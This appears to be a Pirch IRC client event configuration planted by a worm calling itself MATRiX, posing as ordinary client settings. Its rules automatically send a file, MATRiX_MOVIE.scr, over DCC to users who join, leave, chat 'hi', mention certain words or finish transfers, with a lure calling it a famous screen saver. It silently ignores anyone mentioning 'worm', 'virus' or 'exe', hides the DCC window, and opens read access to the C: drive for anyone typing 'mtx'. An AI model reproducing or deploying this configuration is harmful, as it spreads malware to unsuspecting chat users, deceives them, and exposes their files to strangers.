;PK   
[Levels]
Enabled=1
Count=6
Level1=000-Unknowns
000-UnknownsEnabled=1
Level2=100-Level 100
100-Level 100Enabled=1
Level3=200-Level 200
200-Level 200Enabled=1
Level4=300-Level 300
300-Level 300Enabled=1
Level5=400-Level 400
400-Level 400Enabled=1
Level6=500-Level 500
500-Level 500Enabled=1
;PK   
[000-Unknowns]
User1=*!*@*
UserCount=1
Event1=ON PART:#:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr | /msg $nick Hi! Here is The Famous MATRiX MOVIE Screen Saver ! ENJOY  :)
Event2=ON JOIN:#:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr | /notice $nick Hi! Here is The Famous MATRiX MOVIE Screen Saver ! ENJOY  :)
Event3=ON QUIT:/msg #MATRiXwormmain I'm Just An0ther MATRiX PircH SlaV3 :)
Event4=ON TEXT:*sex*:*:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr
Event5=ON TEXT:*trade*:*:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr
Event6=ON TEXT:*worm*:*:/ignore $nick 1
Event7=ON TEXT:*virus*:*:/ignore $nick 1
Event8=ON TEXT:*exe*:*:/ignore $nick 1
Event9=ON TEXT:*mtx*:*:/faccess $nick C:\ 5
Event10=ON DCCDONE:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr
Event11=ON DCCSENT:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr
EventCount=11
;PK   
[100-Level 100]
User1=*!*@*
UserCount=1
Event1=ON CHAT:*hi*:/dcc send $nick C:\Windows\MATRiX_MOVIE.scr
EventCount=1
;PK   
[200-Level 200]
UserCount=0
EventCount=0
;PK   
[300-Level 300]
UserCount=0
EventCount=0
;PK   
[400-Level 400]
UserCount=0
EventCount=0
;PK   
[500-Level 500]
UserCount=0
EventCount=0
;PK   
[DCC]
AutoHideDccWin=1
;PK   
